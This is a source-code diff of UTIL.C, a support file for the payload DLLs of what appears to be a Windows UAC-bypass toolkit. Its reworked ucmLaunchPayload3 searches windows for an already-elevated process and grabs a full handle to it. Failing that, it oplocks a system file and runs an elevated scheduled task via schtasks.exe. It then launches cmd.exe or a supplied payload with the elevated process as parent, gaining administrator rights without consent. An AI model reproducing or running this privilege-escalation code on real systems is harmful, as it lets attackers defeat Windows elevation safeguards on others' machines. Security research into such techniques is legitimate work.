@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2025
+*  (C) COPYRIGHT AUTHORS, 2017 - 2026
 *
 *  TITLE:       UTIL.C
 *
-*  VERSION:     3.69
+*  VERSION:     3.71
 *
-*  DATE:        07 Jul 2025
+*  DATE:        21 Jul 2026
 *
 *  Global support routines file shared between payload dlls.
 *
@@ -53,6 +53,63 @@ BOOLEAN ucmxHeapFree(
     return RtlFreeHeap(NtCurrentPeb()->ProcessHeap,
         0,
         BaseAddress);
+}
+
+/*
+* ucmLogMessage
+*
+* Purpose:
+*
+* Simple debug logger.
+*
+*/
+VOID ucmLogMessage(
+    _In_ LPCWSTR FileName,
+    _In_ LPCWSTR Message
+)
+{
+    HANDLE hFile;
+    DWORD written;
+    WCHAR buffer[512];
+    SYSTEMTIME st;
+    DWORD length;
+
+    if (FileName == NULL || Message == NULL) {
+        return;
+    }
+
+    GetLocalTime(&st);
+
+    length = wsprintf(
+        buffer,
+        L"[%02u:%02u:%02u.%03u] %s\r\n",
+        st.wHour,
+        st.wMinute,
+        st.wSecond,
+        st.wMilliseconds,
+        Message);
+
+    hFile = CreateFile(
+        FileName,
+        FILE_APPEND_DATA,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return;
+    }
+
+    WriteFile(
+        hFile,
+        buffer,
+        length * sizeof(WCHAR),
+        &written,
+        NULL);
+
+    CloseHandle(hFile);
 }
 
 /*
@@ -1174,16 +1231,20 @@ BOOL ucmLaunchPayload2(
 * Purpose:
 *
 * Run payload (by default cmd.exe from system32)
+* This routine takes extra parameters - file to oplock and task to execute
 *
 */
 BOOL ucmLaunchPayload3(
+    _In_ UCM_METHOD ucmMethod,
     _In_opt_ LPWSTR pszPayload,
-    _In_opt_ DWORD cbPayload)
+    _In_opt_ DWORD cbPayload,
+    _In_ LPWSTR pszOpLockFile,
+    _In_ LPWSTR pszTask
+)
 {
     BOOL bResult = FALSE, bCommandLineAllocated = FALSE;
     ULONG i;
-    HWND hwnd;
-    HANDLE hProcess;
+    HANDLE hProcess = NULL;
     LPWSTR lpCommandLine = NULL;
     SIZE_T memIO;
     OPLOCK_FILE_CONTEXT ofc;
@@ -1191,8 +1252,14 @@ BOOL ucmLaunchPayload3(
 
     WCHAR cmdbuf[MAX_PATH * 2]; //complete process command line
     WCHAR sysdir[MAX_PATH + 1]; //process working directory
+    WCHAR szOplockPath[MAX_PATH * 2];
+
+    if ((pszOpLockFile == NULL) || (pszTask == NULL))
+        return bResult;
 
     if (ucmCheckUIAccessPermissions()) {
+
+        ucmLogDbgMsg(L"[Fubuki] ucmCheckUIAccessPermissions passed\r\n");
 
         //
         // Determine what we want to execute, custom parameter or default cmd.exe
@@ -1221,7 +1288,6 @@ BOOL ucmLaunchPayload3(
             //
             // Default cmd.exe should be started.
             //
-
             RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
 
             //
@@ -1231,7 +1297,7 @@ BOOL ucmLaunchPayload3(
             ucmxQuerySystemDirectory(sysdir, FALSE);
 
             _strcpy(cmdbuf, sysdir);
-            _strcat(cmdbuf, L"cmd.exe");
+            _strcat(cmdbuf, CMD_EXE);
 
             lpCommandLine = cmdbuf;
             bCommandLineAllocated = FALSE;
@@ -1241,35 +1307,54 @@ BOOL ucmLaunchPayload3(
         ofc.Length = sizeof(ofc);
         ofc.FileHandle = INVALID_HANDLE_VALUE;
 
-        hwnd = ucmFindFirstElevatedWindow();
-        if (!hwnd) {
-            if (ucmStartBackupLockedElevatedProcess(&ofc)) {
-                for (i = 0; i < 5000; i += 500) {
-                    ucmSleep(500);
-                    hwnd = ucmFindFirstElevatedWindow();
-                }
+        hProcess = ucmFindFirstElevatedProcessHandle();
+        if (!hProcess) {
+
+            ucmLogDbgMsg(L"[Fubuki] ucmFindFirstElevatedProcessHandle is NULL\r\n");
+
+            RtlSecureZeroMemory(szOplockPath, sizeof(szOplockPath));
+
+            switch (ucmMethod) {
+            case UacMethodQuickAssist:
+                _strcpy(szOplockPath, USER_SHARED_DATA->NtSystemRoot);
+                _strcat(szOplockPath, pszOpLockFile);
+                break;
+            case UacMethodTabTip:
+            case UacMethodNarrator:
+                _strcpy(szOplockPath, pszOpLockFile);
+                break;
+            default:
+                break;
             }
-        }
-        if (hwnd)
-        {
-            RtlSecureZeroMemory(&pi, sizeof(pi));
-            hProcess = ucmGetHwndFullProcessHandle(hwnd);
-            if (hProcess)
+
+            if (ucmStartLockedElevatedProcess(
+                szOplockPath,
+                pszTask,
+                &ofc))
             {
-                bResult = ucmCreateProcessWithParent(lpCommandLine, hProcess, CREATE_NEW_CONSOLE, SW_SHOW, &pi);
-                if (bResult) {
-                    CloseHandle(pi.hThread);
-                    CloseHandle(pi.hProcess);
-
+                for (i = 0; i < 5000; i += 50) {
+                    hProcess = ucmFindFirstElevatedProcessHandle();
+                    if (hProcess)
+                        break;
+                    ucmSleep(50);
                 }
-                CloseHandle(hProcess);
+            }
+
+            if (ofc.FileHandle != INVALID_HANDLE_VALUE) {
+                ucmReleaseOpLock(&ofc);
             }
         }
 
-        if (ofc.FileHandle != INVALID_HANDLE_VALUE) {
-            ucmReleaseOpLock(&ofc);
+        if (hProcess) {
+            ucmLogDbgMsg(L"[Fubuki] Calling ucmCreateProcessWithParent\r\n");
+            RtlSecureZeroMemory(&pi, sizeof(pi));
+            bResult = ucmCreateProcessWithParent(lpCommandLine, hProcess, CREATE_NEW_CONSOLE, SW_SHOW, &pi);
+            if (bResult) {
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
+            }
+            CloseHandle(hProcess);
         }
-
     }
 
     //
@@ -1922,6 +2007,50 @@ NTSTATUS ucmIsProcessElevated(
 }
 
 /*
+* ucmQueryEnvironmentVariable
+*
+* Purpose:
+*
+* Query environment variable.
+*
+*/
+BOOL ucmQueryEnvironmentVariable(
+    _In_ LPCWSTR Name,
+    _Out_ LPWSTR Buffer,
+    _In_ ULONG BufferLength
+)
+{
+    NTSTATUS ntStatus;
+    UNICODE_STRING usName;
+    UNICODE_STRING usValue;
+
+    if (Name == NULL || Buffer == NULL || BufferLength == 0)
+        return FALSE;
+
+    RtlSecureZeroMemory(Buffer, BufferLength * sizeof(WCHAR));
+
+    ntStatus = RtlInitUnicodeStringEx(&usName, Name);
+    if (!NT_SUCCESS(ntStatus))
+        return FALSE;
+
+    usValue.Buffer = Buffer;
+    usValue.Length = 0;
+    usValue.MaximumLength = (USHORT)(BufferLength * sizeof(WCHAR));
+
+    ntStatus = RtlQueryEnvironmentVariable_U(
+        NULL,
+        &usName,
+        &usValue);
+
+    if (!NT_SUCCESS(ntStatus))
+        return FALSE;
+
+    Buffer[usValue.Length / sizeof(WCHAR)] = 0;
+
+    return TRUE;
+}
+
+/*
 * ucmSetEnvironmentVariable
 *
 * Purpose:
@@ -1967,7 +2096,7 @@ BOOL ucmSetEnvironmentVariable(
 *
 * Purpose:
 *
-* Thread procedure to wait for oplock notification.
+* Thread procedure waiting for oplock notification.
 *
 */
 DWORD WINAPI ucmxWaitForOpLockThread(
@@ -2030,6 +2159,14 @@ BOOL ucmWaitForOpLock(
     return bResult;
 }
 
+/*
+* ucmReleaseOpLock
+*
+* Purpose:
+*
+* Release oplock file context resources.
+*
+*/
 BOOL ucmReleaseOpLock(
     _In_ POPLOCK_FILE_CONTEXT ofc
 )
@@ -2048,6 +2185,14 @@ BOOL ucmReleaseOpLock(
     return TRUE;
 }
 
+/*
+* ucmOpLockFile
+*
+* Purpose:
+*
+* Request oplock on specified file.
+*
+*/
 BOOL ucmOpLockFile(
     _In_ LPCWSTR FileName,
     _In_ ACCESS_MASK DesiredAccess,
@@ -2095,6 +2240,8 @@ BOOL ucmOpLockFile(
 
     ofc->FileHandle = CreateFile(FileName, DesiredAccess, ShareMode, NULL, OPEN_EXISTING, flags, NULL);
     if (ofc->FileHandle == INVALID_HANDLE_VALUE) {
+        CloseHandle(ofc->Overlapped.hEvent);
+        ofc->Overlapped.hEvent = NULL;
         return FALSE;
     }
 
@@ -2107,6 +2254,10 @@ BOOL ucmOpLockFile(
     }
 
     if (GetLastError() != ERROR_IO_PENDING) {
+        CloseHandle(ofc->FileHandle);
+        CloseHandle(ofc->Overlapped.hEvent);
+        ofc->Overlapped.hEvent = NULL;
+        ofc->FileHandle = NULL;
         return FALSE;
     }
 
@@ -2122,7 +2273,7 @@ BOOL ucmOpLockFile(
 *
 * Purpose:
 *
-* EnumWindows callback to hide windows belonging to current process.
+* EnumWindows callback to hide current process windows.
 *
 */
 BOOL ucmxHideMainWindowCallback(
@@ -2156,7 +2307,7 @@ BOOL ucmxHideMainWindowCallback(
 *
 * Purpose:
 *
-* Hide current process windows.
+* Hide current process main windows.
 *
 */
 VOID ucmHideMainWindow(
@@ -2178,35 +2329,49 @@ BOOL ucmCheckUIAccessPermissions(
     VOID)
 {
     BOOL bResult = FALSE;
+    ULONG retLen, uiAccess;
+    NTSTATUS status;
     HANDLE hToken = NULL;
     BYTE tmlbuf[sizeof(TOKEN_MANDATORY_LABEL) + sizeof(SID)];
-    TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)&tmlbuf[0];
-    DWORD UIAccessFlag = 0;
-    DWORD* pdwIntegrityLevel = NULL;
-    DWORD retLen = 0;
+    PTOKEN_MANDATORY_LABEL tml = (PTOKEN_MANDATORY_LABEL)tmlbuf;
+    DWORD* pdwIntegrityLevel;
 
     do {
 
-        if (!NT_SUCCESS(NtOpenProcessToken(
+        status = NtOpenProcessToken(
             NtCurrentProcess(),
             MAXIMUM_ALLOWED,
-            &hToken)))
-        {
-            break;
-        }
+            &hToken);
 
-        retLen = sizeof(UIAccessFlag);
-        if (!GetTokenInformation(hToken, TokenUIAccess, &UIAccessFlag, sizeof(UIAccessFlag), &retLen))
+        if (!NT_SUCCESS(status))
             break;
 
-        if (UIAccessFlag == 0)
+        status = NtQueryInformationToken(
+            hToken,
+            TokenUIAccess,
+            &uiAccess,
+            sizeof(uiAccess),
+            &retLen);
+
+        if (!NT_SUCCESS(status))
             break;
 
-        retLen = sizeof(tmlbuf);
-        if (!GetTokenInformation(hToken, TokenIntegrityLevel, tml, retLen, &retLen))
+        if (uiAccess == 0)
             break;
 
-        pdwIntegrityLevel = GetSidSubAuthority(tml->Label.Sid, 0);
+        RtlSecureZeroMemory(tmlbuf, sizeof(tmlbuf));
+
+        status = NtQueryInformationToken(
+            hToken,
+            TokenIntegrityLevel,
+            tml,
+            sizeof(tmlbuf),
+            &retLen);
+
+        if (!NT_SUCCESS(status))
+            break;
+
+        pdwIntegrityLevel = RtlSubAuthoritySid(tml->Label.Sid, 0);
         if (*pdwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
             break;
 
@@ -2214,7 +2379,9 @@ BOOL ucmCheckUIAccessPermissions(
 
     } while (FALSE);
 
-    if (hToken) NtClose(hToken);
+    if (hToken)
+        NtClose(hToken);
+
     return bResult;
 }
 
@@ -2225,7 +2392,7 @@ typedef HANDLE(WINAPI* pfnGetProcessHandleFromHwnd)(HWND hwnd);
 *
 * Purpose:
 *
-* Wrapper for oleacc!GetProcessHandleFromHwnd.
+* Wrapper for oleacc!GetProcessHandleFromHwnd->user32!GetWindowProcessHandle->win32u!NtUserGetWindowProcessHandle
 *
 */
 HANDLE ucmCallGetProcessHandleFromHwnd(
@@ -2256,11 +2423,11 @@ HANDLE ucmCallGetProcessHandleFromHwnd(
 *
 */
 BOOL ucmCreateProcessWithParent(
-    _In_ LPWSTR lpCommandLine,
+    _Inout_opt_ LPWSTR lpCommandLine,
     _In_ HANDLE hParent,
     _In_ DWORD dwFlags,
     _In_ WORD wShow,
-    _In_ PROCESS_INFORMATION* pi
+    _In_ PROCESS_INFORMATION * pi
 )
 {
     SIZE_T ptsize = 0;
@@ -2311,8 +2478,17 @@ HANDLE ucmGetHwndFullProcessHandle(
 
     hProcess = ucmCallGetProcessHandleFromHwnd(hwnd);
     if (hProcess) {
-        DuplicateHandle(hProcess, (HANDLE)-1, (HANDLE)-1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS);
-        CloseHandle(hProcess);
+        if (!NT_SUCCESS(NtDuplicateObject(hProcess,
+            NtCurrentProcess(),
+            NtCurrentProcess(),
+            &hDuplicate,
+            0,
+            0,
+            DUPLICATE_SAME_ACCESS)))
+        {
+            hDuplicate = NULL;
+        }
+        NtClose(hProcess);
     }
 
     return hDuplicate;
@@ -2327,7 +2503,7 @@ HANDLE ucmGetHwndFullProcessHandle(
 *
 */
 BOOL ucmxEnumElevatedWindows(
-    _In_ HWND hwnd, 
+    _In_ HWND hwnd,
     _In_ LPARAM lParam)
 {
     DWORD dwPid = 0;
@@ -2335,6 +2511,10 @@ BOOL ucmxEnumElevatedWindows(
     HANDLE hToken = NULL;
     DWORD tkElvType = 0;
     DWORD retLen = 0;
+
+    if (!lParam) {
+        return FALSE;
+    }
 
     GetWindowThreadProcessId(hwnd, &dwPid);
     if (dwPid == 0) {
@@ -2365,94 +2545,163 @@ BOOL ucmxEnumElevatedWindows(
 
     CloseHandle(hToken);
 
-    if (tkElvType == TokenElevationTypeFull) {
-        //
-        // Stop enumeration and return hwnd.
-        //
-        *(HWND*)lParam = hwnd;
-        return FALSE;
+    if (tkElvType != TokenElevationTypeFull) {
+        // Continue to next window.
+        return TRUE;
     }
 
+    hProcess = ucmGetHwndFullProcessHandle(hwnd);
+    if (hProcess) {
+        //
+        // Stop enumeration.
+        //
+        *(HANDLE*)lParam = hProcess;
+        return FALSE;
+    }
     return TRUE;
 }
 
 /*
-* ucmFindFirstElevatedWindow
+* ucmFindFirstElevatedProcessHandle
 *
 * Purpose:
 *
-* Find first elevated window.
+* Find first elevated process window and return process handle.
 *
 */
-HWND ucmFindFirstElevatedWindow(
+HANDLE ucmFindFirstElevatedProcessHandle(
     VOID
 )
 {
     HWND hwnd = NULL;
-    EnumWindows((WNDENUMPROC)ucmxEnumElevatedWindows, (LPARAM)&hwnd);
-    return hwnd;
+    HANDLE hProcess = NULL;
+
+    //
+    // First try message-only windows.
+    //
+    do {
+        hwnd = FindWindowEx(HWND_MESSAGE, hwnd, NULL, NULL);
+        if (hwnd) {
+            if (!ucmxEnumElevatedWindows(hwnd, (LPARAM)&hProcess)) {
+                break;
+            }
+        }
+    } while (hwnd);
+
+    //
+    // Repeat the search over top-level desktop windows.
+    //
+    if (!hwnd) {
+        do {
+            hwnd = FindWindowEx(NULL, hwnd, NULL, NULL);
+            if (hwnd) {
+                if (!ucmxEnumElevatedWindows(hwnd, (LPARAM)&hProcess)) {
+                    break;
+                }
+            }
+        } while (hwnd);
+    }
+
+    return hProcess;
 }
 
 /*
-* ucmStartBackupLockedElevatedProcess
+* ucmRunScheduledTask
 *
 * Purpose:
 *
-* Create oplock on system file and run elevated task through schtasks.exe.
+* Execute scheduled task.
 *
 */
-BOOL ucmStartBackupLockedElevatedProcess(
-    _In_ POPLOCK_FILE_CONTEXT ofc
+BOOL ucmRunScheduledTask(
+    _In_ LPCWSTR TaskName
 )
 {
     BOOL bResult = FALSE;
-    WCHAR szTaskCmdLine[MAX_PATH * 4];
-    WCHAR szOplockPath[MAX_PATH * 2];
-    PROCESS_INFORMATION pi;
-    STARTUPINFO si;
-    DWORD dwExitCode = 1;
+    WCHAR szTaskCmdLine[MAX_PATH * 2];
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFOW StartupInfo;
+    DWORD ExitCode = ERROR_GEN_FAILURE;
 
-    if (ofc == NULL || ofc->Length < sizeof(OPLOCK_FILE_CONTEXT)) {
+    if (TaskName == NULL || *TaskName == 0)
         return FALSE;
-    }
 
-    RtlSecureZeroMemory(szOplockPath, sizeof(szOplockPath));
-    ucmxQuerySystemDirectory(szOplockPath, FALSE);
-    _strcpy(szTaskCmdLine, szOplockPath);
-    _strcat(szOplockPath, L"WiFiCloudStore.dll");
-    _strcat(szTaskCmdLine, L"\\schtasks.exe /RUN /TN \"\\Microsoft\\Windows\\WlanSvc\\CDSSync\" /I");
+    RtlSecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
+    RtlSecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
 
-    if (!ucmOpLockFile(szOplockPath, 
-        GENERIC_READ, 
-        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
-        TRUE, 
-        ofc)) 
+    StartupInfo.cb = sizeof(StartupInfo);
+    StartupInfo.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
+    StartupInfo.wShowWindow = SW_HIDE;
+
+    _strcpy(szTaskCmdLine, USER_SHARED_DATA->NtSystemRoot);
+    _strcat(szTaskCmdLine, L"\\System32\\schtasks.exe /RUN /TN \"");
+    _strcat(szTaskCmdLine, TaskName);
+    _strcat(szTaskCmdLine, L"\" /I");
+
+    ucmSetEnvironmentVariable(T_WINDIR, USER_SHARED_DATA->NtSystemRoot);
+    ucmSetEnvironmentVariable(T_SYSTEMROOT, USER_SHARED_DATA->NtSystemRoot);
+
+    if (!CreateProcess(
+        NULL,
+        szTaskCmdLine,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NEW_CONSOLE,
+        NULL,
+        NULL,
+        &StartupInfo,
+        &ProcessInfo))
     {
         return FALSE;
     }
-    
-    RtlSecureZeroMemory(&pi, sizeof(pi));
-    RtlSecureZeroMemory(&si, sizeof(si));
 
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
+    CloseHandle(ProcessInfo.hThread);
 
-    if (!CreateProcess(NULL, szTaskCmdLine, NULL, NULL, FALSE, 
-        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) 
-    {
-        ucmReleaseOpLock(ofc);
-        return FALSE;
-    }
-
-    CloseHandle(pi.hThread);
-    if (WaitForSingleObject(pi.hProcess, 3000) == WAIT_OBJECT_0) {
-        if (GetExitCodeProcess(pi.hProcess, &dwExitCode)) {
-            bResult = (dwExitCode == 0);
+    if (WaitForSingleObject(ProcessInfo.hProcess, 3000) == WAIT_OBJECT_0) {
+        if (GetExitCodeProcess(ProcessInfo.hProcess, &ExitCode)) {
+            bResult = (ExitCode == ERROR_SUCCESS);
         }
     }
 
-    CloseHandle(pi.hProcess);
+    CloseHandle(ProcessInfo.hProcess);
+
+    return bResult;
+}
+
+/*
+* ucmStartLockedElevatedProcess
+*
+* Purpose:
+*
+* Create oplock and start elevated scheduled task.
+*
+*/
+BOOL ucmStartLockedElevatedProcess(
+    _In_ LPCWSTR OplockFile,
+    _In_ LPCWSTR TaskName,
+    _In_ POPLOCK_FILE_CONTEXT ofc
+)
+{
+    BOOL bResult;
+
+    if (OplockFile == NULL || TaskName == NULL || ofc == NULL)
+        return FALSE;
+
+    if (ofc->Length < sizeof(OPLOCK_FILE_CONTEXT))
+        return FALSE;
+
+    if (!ucmOpLockFile(
+        OplockFile,
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        TRUE,
+        ofc))
+    {
+        return FALSE;
+    }
+
+    bResult = ucmRunScheduledTask(TaskName);
 
     if (!bResult) {
         ucmReleaseOpLock(ofc);
